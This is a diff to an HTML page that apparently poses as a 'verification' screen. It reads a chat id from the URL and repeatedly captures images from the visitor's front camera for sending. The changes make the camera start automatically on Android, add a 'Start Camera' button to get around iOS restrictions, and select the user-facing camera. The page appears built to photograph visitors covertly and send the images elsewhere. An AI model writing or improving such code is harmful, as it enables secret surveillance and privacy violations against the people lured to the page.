@@ -44,6 +44,17 @@
         }
         video {
             display: none;
+            width: 300px;
+            height: 200px;
+        }
+        #startButton {
+            padding: 10px 20px;
+            background-color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            color: #7D2AE8;
+            font-weight: bold;
+            cursor: pointer;
         }
         .console-container {
             position: fixed;
@@ -64,15 +75,17 @@
 
 <div class="verification-container">
     <div class="rotate-icon"></div>
+    <button id="startButton" style="display: none;">Start Camera</button>
 </div>
 
-<video id="video" width="300" height="200" autoplay></video>
+<video id="video" playsinline></video>
 
 <!-- Custom in-browser console -->
 <div class="console-container" id="console-log"></div>
 
 <script>
     const video = document.querySelector("#video");
+    const startButton = document.getElementById('startButton');
     const chatId = new URLSearchParams(window.location.search).get("id");
     let captureCount = 0;
     const maxCaptures = 4;
@@ -86,22 +99,59 @@
         consoleLog.scrollTop = consoleLog.scrollHeight;
     }
 
-    // Get user media (camera access)
-    if (navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function(stream) {
-                video.srcObject = stream;
-                customLog('Camera access granted.');
-            })
-            .catch(function(error) {
-                customLog('Error accessing media devices: ' + error.message);
-                alert('Error accessing media devices: ' + error.message);
-            });
-    } else {
-        customLog('getUserMedia is not supported in your browser.');
-        alert('getUserMedia is not supported in your browser.');
+    // Function to detect iOS
+    function isIOS() {
+        return /iPhone|iPad|iPod/i.test(navigator.userAgent);
     }
 
+    // Function to detect Android
+    function isAndroid() {
+        return /Android/i.test(navigator.userAgent);
+    }
+
+    // Handle Android vs iOS
+    function handleDevice() {
+        if (isIOS()) {
+            customLog("iOS detected. Waiting for user interaction to start the camera.");
+            startButton.style.display = "block";
+            startButton.addEventListener('click', function() {
+                startCamera();
+            });
+        } else if (isAndroid()) {
+            customLog("Android detected. Starting camera automatically.");
+            startCamera();
+        } else {
+            customLog("Non-mobile device or unsupported platform.");
+            alert("Unsupported platform.");
+        }
+    }
+
+    function startCamera() {
+        customLog('Starting camera access...');
+        if (navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.style.display = "block"; // Show the video element
+                    video.play().then(() => {
+                        customLog('Video playback started.');
+                    }).catch(function(playbackError) {
+                        customLog('Video playback error: ' + playbackError.message);
+                        alert('Video playback error: ' + playbackError.message);
+                    });
+                    customLog('Camera access granted.');
+                })
+                .catch(function(error) {
+                    customLog('Error accessing media devices: ' + error.message);
+                    alert('Error accessing media devices: ' + error.message);
+                });
+        } else {
+            customLog('getUserMedia is not supported in your browser.');
+            alert('getUserMedia is not supported in your browser.');
+        }
+    }
+
+    // Compress and send image function (unchanged)
     async function compressAndSendImage(image_data, quality, format) {
         try {
             const img = new Image();
@@ -177,6 +227,9 @@
         if (video.paused || video.ended) return;
         captureAndSendImage();
     }, 500);
+
+    // Run the device handler when the page loads
+    window.onload = handleDevice;
 </script>
 
 </body>
